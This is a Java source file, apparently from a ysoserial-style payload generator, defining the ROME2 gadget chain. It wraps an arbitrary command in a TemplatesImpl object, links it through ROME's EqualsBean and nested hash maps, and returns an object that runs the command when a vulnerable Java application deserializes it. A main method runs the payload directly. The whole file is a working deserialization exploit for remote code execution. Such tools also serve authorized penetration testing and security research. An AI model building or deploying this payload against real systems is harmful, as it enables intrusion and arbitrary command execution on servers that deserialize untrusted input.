package com.h2tg.ysogate.payloads.gadgets;


import com.h2tg.ysogate.payloads.gadgets.jdk.GHashMap;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.sun.syndication.feed.impl.EqualsBean;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;

import javax.xml.transform.Templates;
import java.util.Map;


/**
 * JDK 8+
 */
@Dependencies("rome:rome:1.0")
public class ROME2 implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
		Object o = Gadgets.createTemplatesImpl(command);

		EqualsBean bean = new EqualsBean(String.class, "");

		Map map1 = Gadgets.createMap("aa", o);
		map1.put("bB", bean);

		Map map2 = Gadgets.createMap("aa", bean);
		map2.put("bB", o);

		Reflections.setFieldValue(bean, "_beanClass", Templates.class);
		Reflections.setFieldValue(bean, "_obj", o);

		GHashMap gHashMap = new GHashMap();
		return gHashMap.readObject2HashCode(map1, map2);
//		return Gadgets.makeMap(map1, map2);
	}

	public static void main ( final String[] args ) throws Exception {
		PayloadRunner.run(ROME2.class, args);
	}
}
